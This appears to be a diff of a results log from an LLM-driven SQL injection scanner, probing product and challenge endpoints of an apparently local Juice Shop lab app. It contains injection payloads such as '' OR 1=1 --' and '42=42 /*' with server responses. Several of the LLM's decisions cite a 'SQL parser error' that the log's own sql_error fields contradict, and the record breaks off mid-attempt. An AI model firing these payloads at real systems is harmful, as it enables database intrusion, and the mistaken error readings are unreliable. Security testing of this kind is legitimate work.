@@ -1,140 +1,770 @@
 {
-  "started_at": "2026-06-25T17:35:46.243407+00:00",
+  "started_at": "2026-06-26T06:08:15.457231+00:00",
   "targets_file": "sqli_targets.json",
-  "target_count": 6,
+  "target_count": 10,
   "results": [
     {
       "method": "GET",
       "path": "/api/Challenges",
       "url": "http://127.0.0.1:8080/api/Challenges",
       "endpoint_context": {
-        "endpoint_type": "list_filter",
-        "resource": "Challenge list",
-        "likely_sql_context": "list_filter",
-        "recommended_attack_style": "filter_boolean_probe",
+        "endpoint_type": "metadata_or_challenge",
+        "resource": "Challenges",
+        "likely_sql_context": "metadata",
+        "recommended_attack_style": "skip_low_value",
         "avoid_payload_styles": [
-          "auth_bypass",
-          "numeric_probe"
+          "union_enum"
         ],
-        "probe_priority": "high",
+        "probe_priority": "skip",
         "confidence": 0.8,
-        "reason": "The endpoint is a GET request with a query parameter 'key', suggesting a filter or search functionality."
+        "reason": "endpoint appears to serve metadata"
       },
       "params": [
         {
           "name": "key",
           "in": "query",
           "endpoint_context": {
-            "endpoint_type": "list_filter",
-            "resource": "Challenge list",
-            "likely_sql_context": "list_filter",
-            "recommended_attack_style": "filter_boolean_probe",
+            "endpoint_type": "metadata_or_challenge",
+            "resource": "Challenges",
+            "likely_sql_context": "metadata",
+            "recommended_attack_style": "skip_low_value",
             "avoid_payload_styles": [
-              "auth_bypass",
-              "numeric_probe"
+              "union_enum"
+            ],
+            "probe_priority": "skip",
+            "confidence": 0.8,
+            "reason": "endpoint appears to serve metadata"
+          },
+          "suitability": {
+            "probe": false,
+            "confidence": 1,
+            "reason": "endpoint appears to serve metadata",
+            "starting_strategy": "skip_low_value"
+          },
+          "payload_count": 0,
+          "attempts": [],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Skipped by suitability gate: endpoint appears to serve metadata"
+        },
+        {
+          "name": "name",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "metadata_or_challenge",
+            "resource": "Challenges",
+            "likely_sql_context": "metadata",
+            "recommended_attack_style": "skip_low_value",
+            "avoid_payload_styles": [
+              "union_enum"
+            ],
+            "probe_priority": "skip",
+            "confidence": 0.8,
+            "reason": "endpoint appears to serve metadata"
+          },
+          "suitability": {
+            "probe": false,
+            "confidence": 1,
+            "reason": "endpoint appears to serve metadata",
+            "starting_strategy": "skip_low_value"
+          },
+          "payload_count": 0,
+          "attempts": [],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Skipped by suitability gate: endpoint appears to serve metadata"
+        }
+      ]
+    },
+    {
+      "method": "GET",
+      "path": "/api/Products/1",
+      "url": "http://127.0.0.1:8080/api/Products/1",
+      "endpoint_context": {
+        "endpoint_type": "product_detail",
+        "resource": "Product",
+        "likely_sql_context": "id_lookup",
+        "recommended_attack_style": "numeric_identifier_probe",
+        "avoid_payload_styles": [
+          "union_enum"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.9,
+        "reason": "Product ID is passed in the URL path"
+      },
+      "params": [
+        {
+          "name": "product_id",
+          "in": "path",
+          "endpoint_context": {
+            "endpoint_type": "product_detail",
+            "resource": "Product",
+            "likely_sql_context": "id_lookup",
+            "recommended_attack_style": "numeric_identifier_probe",
+            "avoid_payload_styles": [
+              "union_enum"
             ],
             "probe_priority": "high",
-            "confidence": 0.8,
-            "reason": "The endpoint is a GET request with a query parameter 'key', suggesting a filter or search functionality."
+            "confidence": 0.9,
+            "reason": "Product ID is passed in the URL path"
           },
           "suitability": {
             "probe": true,
-            "confidence": 0.8,
-            "reason": "The endpoint is a GET request with a query parameter 'key', suggesting a filter or search functionality.",
-            "starting_strategy": "filter_boolean_probe"
+            "confidence": 0.9,
+            "reason": "Product ID is passed in the URL path",
+            "starting_strategy": "numeric_identifier_probe"
           },
-          "payload_count": 2,
+          "payload_count": 1,
           "attempts": [
             {
               "payload_phase": "primary_probe",
-              "payload": "' OR 1=1 --",
-              "payload_rationale": "Boolean probe for filter functionality",
+              "payload": "1 OR 1=1 --",
+              "payload_rationale": "numeric identifier probe with boolean confirmation",
               "expected_signal": "SQL parser error or unexpected response",
               "expected_marker": "",
               "baseline": {
                 "status_code": 200,
-                "elapsed_ms": 2078,
+                "elapsed_ms": 2070,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
-                "body_length": 30,
-                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+                "body_length": 257,
+                "body_sample": "{\"status\":\"success\",\"data\":{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-06-26T06:07:36.879Z\",\"updatedAt\":\"2026-06-26T06:07:36.879Z\",\"deletedAt\":null}}"
               },
               "probe": {
+                "status_code": 404,
+                "elapsed_ms": 2103,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 35,
+                "body_sample": "{\"message\":\"Not Found\",\"errors\":[]}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 404,
+                "status_changed": true,
+                "content_type_changed": false,
+                "body_length_delta": -222,
+                "body_changed": true,
+                "elapsed_delta_ms": 33,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 0.0,
+                "reason": "No SQL error, auth bypass, timing, content-type, or meaningful body change.",
+                "next_step": "None"
+              }
+            }
+          ],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "No SQL error, auth bypass, timing, content-type, or meaningful body change."
+        },
+        {
+          "name": "d",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "product_detail",
+            "resource": "Product",
+            "likely_sql_context": "id_lookup",
+            "recommended_attack_style": "numeric_identifier_probe",
+            "avoid_payload_styles": [
+              "union_enum"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "Product ID is passed in the URL path"
+          },
+          "suitability": {
+            "probe": false,
+            "confidence": 0.0,
+            "reason": "parameter 'd' is a query parameter and does not fit the route purpose and recommended attack style.",
+            "starting_strategy": "skip"
+          },
+          "payload_count": 0,
+          "attempts": [],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Skipped by suitability gate: parameter 'd' is a query parameter and does not fit the route purpose and recommended attack style."
+        }
+      ]
+    },
+    {
+      "method": "GET",
+      "path": "/api/Products/24",
+      "url": "http://127.0.0.1:8080/api/Products/24",
+      "endpoint_context": {
+        "endpoint_type": "product_detail",
+        "resource": "Product Details",
+        "likely_sql_context": "id_lookup",
+        "recommended_attack_style": "numeric_identifier_probe",
+        "avoid_payload_styles": [
+          "union_enum",
+          "auth_bypass"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "The endpoint is retrieving product details by ID, suggesting a numeric identifier lookup."
+      },
+      "params": [
+        {
+          "name": "product_id",
+          "in": "path",
+          "endpoint_context": {
+            "endpoint_type": "product_detail",
+            "resource": "Product Details",
+            "likely_sql_context": "id_lookup",
+            "recommended_attack_style": "numeric_identifier_probe",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "The endpoint is retrieving product details by ID, suggesting a numeric identifier lookup."
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "The endpoint is retrieving product details by ID, suggesting a numeric identifier lookup.",
+            "starting_strategy": "numeric_identifier_probe"
+          },
+          "payload_count": 1,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": "1=1",
+              "payload_rationale": "numeric identifier probe for id_lookup context",
+              "expected_signal": "SQL parser error or unexpected response",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2059,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 375,
+                "body_sample": "{\"status\":\"success\",\"data\":{\"id\":24,\"name\":\"Apple Pomace\",\"description\":\"Finest pressings of apples. Allergy disclaimer: Might contain traces of worms. Can be <a href=\\\"/#recycle\\\">sent back to us</a> for recycling.\",\"price\":0.89,\"deluxePrice\":0.89,\"image\":\"apple_pressings.jpg\",\"createdAt\":\"2026-06-26T06:07:36.881Z\",\"updatedAt\":\"2026-06-26T06:07:36.881Z\",\"deletedAt\":null}}"
+              },
+              "probe": {
+                "status_code": 404,
+                "elapsed_ms": 2095,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 35,
+                "body_sample": "{\"message\":\"Not Found\",\"errors\":[]}"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 404,
+                "status_changed": true,
+                "content_type_changed": false,
+                "body_length_delta": -340,
+                "body_changed": true,
+                "elapsed_delta_ms": 36,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1.0,
+                "reason": "Enough evidence was gathered, no useful signal remains, or endpoint is not suitable.",
+                "next_step": "Stop further SQLi testing on this endpoint."
+              }
+            }
+          ],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Enough evidence was gathered, no useful signal remains, or endpoint is not suitable."
+        },
+        {
+          "name": "d",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "product_detail",
+            "resource": "Product Details",
+            "likely_sql_context": "id_lookup",
+            "recommended_attack_style": "numeric_identifier_probe",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "The endpoint is retrieving product details by ID, suggesting a numeric identifier lookup."
+          },
+          "suitability": {
+            "probe": false,
+            "confidence": 0.0,
+            "reason": "The parameter 'd' is a query parameter and the endpoint_context recommends avoiding union_enum and auth_bypass payload styles.",
+            "starting_strategy": "Skip"
+          },
+          "payload_count": 0,
+          "attempts": [],
+          "final_decision": "stop",
+          "strongest_decision": "stop",
+          "stop_reason": "Skipped by suitability gate: The parameter 'd' is a query parameter and the endpoint_context recommends avoiding union_enum and auth_bypass payload styles."
+        }
+      ]
+    },
+    {
+      "method": "GET",
+      "path": "/api/Products/42",
+      "url": "http://127.0.0.1:8080/api/Products/42",
+      "endpoint_context": {
+        "endpoint_type": "product_detail",
+        "resource": "Product",
+        "likely_sql_context": "id_lookup",
+        "recommended_attack_style": "numeric_identifier_probe",
+        "avoid_payload_styles": [
+          "union_enum",
+          "auth_bypass"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.9,
+        "reason": "product_id is a numeric path parameter"
+      },
+      "params": [
+        {
+          "name": "product_id",
+          "in": "path",
+          "endpoint_context": {
+            "endpoint_type": "product_detail",
+            "resource": "Product",
+            "likely_sql_context": "id_lookup",
+            "recommended_attack_style": "numeric_identifier_probe",
+            "avoid_payload_styles": [
+              "union_enum",
+              "auth_bypass"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.9,
+            "reason": "product_id is a numeric path parameter"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.9,
+            "reason": "product_id is a numeric path parameter",
+            "starting_strategy": "numeric_identifier_probe"
+          },
+          "payload_count": 6,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": "1=1 /*",
+              "payload_rationale": "numeric identifier probe with a comment marker",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
                 "status_code": 200,
                 "elapsed_ms": 2087,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
-                "body_length": 30,
-                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+                "body_length": 591,
+                "body_sample": "{\"status\":\"success\",\"data\":{\"id\":42,\"name\":\"Best Juice Shop Salesman Artwork\",\"description\":\"Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restaurant supplies, voodoo enhanced asbestos and courtroom souvenirs before <em>finally</em> adding his expertise to the Juice Shop marketing team.\",\"price\":5000,\"deluxePrice\":5000,\"image\":\"artwork2.jpg\",\"createdAt\":\"2026-06-26T06:07:36.881Z\",\"updatedAt\":\"2026-06-26T06:07:36.881Z\",\"deletedAt\":null}}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2050,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 3026,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: Unexpected path: [REDACTED_PATH]=1%20/*</h2>\n      <ul id=\"stacktrace\"><li> &nbsp; &nbsp;at [REDACTED_PATH]:42:18</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:225:26</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] ([REDACTED_PATH]:95:5)</li><li> &nbsp; &nbsp;at trim_prefix ([REDACTED_PATH]:328:13)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:286:9</li><li> &nbsp; &nbsp;at router.process_params ([REDACTED_PATH]:346:12)</li><li> &nbsp; &nbsp;at next ([REDACTED_PATH]:280:10)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]"
               },
               "response_signal": {
                 "available": true,
                 "baseline_status": 200,
-                "probe_status": 200,
-                "status_changed": false,
-                "content_type_changed": false,
-                "body_length_delta": 0,
-                "body_changed": false,
-                "elapsed_delta_ms": 9,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 2435,
+                "body_changed": true,
+                "elapsed_delta_ms": -37,
                 "sql_error": false,
                 "sql_error_excerpt": "",
                 "dbms_hint": "",
                 "auth_bypass_like": false
               },
               "llm_decision": {
-                "decision": "not_decidable",
-                "confidence": 0.5,
-                "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
-                "next_step": "Try another payload or gather more context."
+                "decision": "escalate",
+                "confidence": 0.8,
+                "reason": "SQL parser error in probe response and meaningful body change",
+                "next_step": "numeric identifier probe with a different payload"
               }
             },
             {
               "payload_phase": "primary_probe",
-              "payload": "' OR '1'='1",
-              "payload_rationale": "Repair the delimiter/parenthesis shape by adding a quote to the boolean probe.",
-              "expected_signal": "SQL parser error with unmatched parentheses or LIKE-wrapped search text.",
+              "payload": "42=42 /*",
+              "payload_rationale": "numeric identifier probe with a different payload",
+              "expected_signal": "SQL parser error in probe response and meaningful body change",
               "expected_marker": "",
               "baseline": {
                 "status_code": 200,
-                "elapsed_ms": 2097,
+                "elapsed_ms": 2088,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
-                "body_length": 30,
-                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+                "body_length": 591,
+                "body_sample": "{\"status\":\"success\",\"data\":{\"id\":42,\"name\":\"Best Juice Shop Salesman Artwork\",\"description\":\"Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restaurant supplies, voodoo enhanced asbestos and courtroom souvenirs before <em>finally</em> adding his expertise to the Juice Shop marketing team.\",\"price\":5000,\"deluxePrice\":5000,\"image\":\"artwork2.jpg\",\"createdAt\":\"2026-06-26T06:07:36.881Z\",\"updatedAt\":\"2026-06-26T06:07:36.881Z\",\"deletedAt\":null}}"
               },
               "probe": {
-                "status_code": 200,
-                "elapsed_ms": 2067,
-                "content_type": "application/json; charset=utf-8",
+                "status_code": 500,
+                "elapsed_ms": 2072,
+                "content_type": "text/html; charset=utf-8",
                 "location": "",
-                "body_length": 30,
-                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+                "body_length": 3030,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: Unexpected path: [REDACTED_PATH]=42%20/*</h2>\n      <ul id=\"stacktrace\"><li> &nbsp; &nbsp;at [REDACTED_PATH]:42:18</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:225:26</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] ([REDACTED_PATH]:95:5)</li><li> &nbsp; &nbsp;at trim_prefix ([REDACTED_PATH]:328:13)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:286:9</li><li> &nbsp; &nbsp;at router.process_params ([REDACTED_PATH]:346:12)</li><li> &nbsp; &nbsp;at next ([REDACTED_PATH]:280:10)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]/"
               },
               "response_signal": {
                 "available": true,
                 "baseline_status": 200,
-                "probe_status": 200,
-                "status_changed": false,
-                "content_type_changed": false,
-                "body_length_delta": 0,
-                "body_changed": false,
-                "elapsed_delta_ms": -30,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 2439,
+                "body_changed": true,
+                "elapsed_delta_ms": -16,
                 "sql_error": false,
                 "sql_error_excerpt": "",
                 "dbms_hint": "",
                 "auth_bypass_like": false
               },
               "llm_decision": {
-                "decision": "not_decidable",
-                "confidence": 0.5,
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "SQL parser error in probe response and meaningful body change",
+                "next_step": "Continue with stronger confirmation if attempts remain"
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": "42=43 /*",
+              "payload_rationale": "numeric identifier probe with a different payload",
+              "expected_signal": "SQL parser error in probe response and meaningful body change",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2087,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 591,
+                "body_sample": "{\"status\":\"success\",\"data\":{\"id\":42,\"name\":\"Best Juice Shop Salesman Artwork\",\"description\":\"Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restaurant supplies, voodoo enhanced asbestos and courtroom souvenirs before <em>finally</em> adding his expertise to the Juice Shop marketing team.\",\"price\":5000,\"deluxePrice\":5000,\"image\":\"artwork2.jpg\",\"createdAt\":\"2026-06-26T06:07:36.881Z\",\"updatedAt\":\"2026-06-26T06:07:36.881Z\",\"deletedAt\":null}}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2086,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 3030,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: Unexpected path: [REDACTED_PATH]=43%20/*</h2>\n      <ul id=\"stacktrace\"><li> &nbsp; &nbsp;at [REDACTED_PATH]:42:18</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:225:26</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] ([REDACTED_PATH]:95:5)</li><li> &nbsp; &nbsp;at trim_prefix ([REDACTED_PATH]:328:13)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:286:9</li><li> &nbsp; &nbsp;at router.process_params ([REDACTED_PATH]:346:12)</li><li> &nbsp; &nbsp;at next ([REDACTED_PATH]:280:10)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]/"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 2439,
+                "body_changed": true,
+                "elapsed_delta_ms": -1,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "SQL parser error in probe response and meaningful body change",
+                "next_step": "continue with stronger confirmation if attempts remain"
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": "42=44 /*",
+              "payload_rationale": "numeric identifier probe with a different payload",
+              "expected_signal": "SQL parser error in probe response and meaningful body change",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2091,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 591,
+                "body_sample": "{\"status\":\"success\",\"data\":{\"id\":42,\"name\":\"Best Juice Shop Salesman Artwork\",\"description\":\"Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restaurant supplies, voodoo enhanced asbestos and courtroom souvenirs before <em>finally</em> adding his expertise to the Juice Shop marketing team.\",\"price\":5000,\"deluxePrice\":5000,\"image\":\"artwork2.jpg\",\"createdAt\":\"2026-06-26T06:07:36.881Z\",\"updatedAt\":\"2026-06-26T06:07:36.881Z\",\"deletedAt\":null}}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2084,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 3030,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: Unexpected path: [REDACTED_PATH]=44%20/*</h2>\n      <ul id=\"stacktrace\"><li> &nbsp; &nbsp;at [REDACTED_PATH]:42:18</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:225:26</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] ([REDACTED_PATH]:95:5)</li><li> &nbsp; &nbsp;at trim_prefix ([REDACTED_PATH]:328:13)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:286:9</li><li> &nbsp; &nbsp;at router.process_params ([REDACTED_PATH]:346:12)</li><li> &nbsp; &nbsp;at next ([REDACTED_PATH]:280:10)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]/"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 2439,
+                "body_changed": true,
+                "elapsed_delta_ms": -7,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.8,
+                "reason": "SQL parser error in probe response and meaningful body change",
+                "next_step": "numeric identifier probe with a different payload"
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": "42=45 /*",
+              "payload_rationale": "numeric identifier probe with a different payload",
+              "expected_signal": "SQL parser error in probe response and meaningful body change",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2104,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 591,
+                "body_sample": "{\"status\":\"success\",\"data\":{\"id\":42,\"name\":\"Best Juice Shop Salesman Artwork\",\"description\":\"Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restaurant supplies, voodoo enhanced asbestos and courtroom souvenirs before <em>finally</em> adding his expertise to the Juice Shop marketing team.\",\"price\":5000,\"deluxePrice\":5000,\"image\":\"artwork2.jpg\",\"createdAt\":\"2026-06-26T06:07:36.881Z\",\"updatedAt\":\"2026-06-26T06:07:36.881Z\",\"deletedAt\":null}}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2061,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 3030,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: Unexpected path: [REDACTED_PATH]=45%20/*</h2>\n      <ul id=\"stacktrace\"><li> &nbsp; &nbsp;at [REDACTED_PATH]:42:18</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:225:26</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] ([REDACTED_PATH]:95:5)</li><li> &nbsp; &nbsp;at trim_prefix ([REDACTED_PATH]:328:13)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]:286:9</li><li> &nbsp; &nbsp;at router.process_params ([REDACTED_PATH]:346:12)</li><li> &nbsp; &nbsp;at next ([REDACTED_PATH]:280:10)</li><li> &nbsp; &nbsp;at [REDACTED_PATH]/"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 2439,
+                "body_changed": true,
+                "elapsed_delta_ms": -43,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.8,
+                "reason": "Probe response indicates SQL parser error and meaningful body change.",
+                "next_step": "Continue with stronger confirmation if attempts remain."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": "42=46 /*",
+              "payload_rationale": "numeric identifier probe with a different payload",
+              "expected_signal": "SQL parser error in probe response and meaningful body change",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2101,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 591,
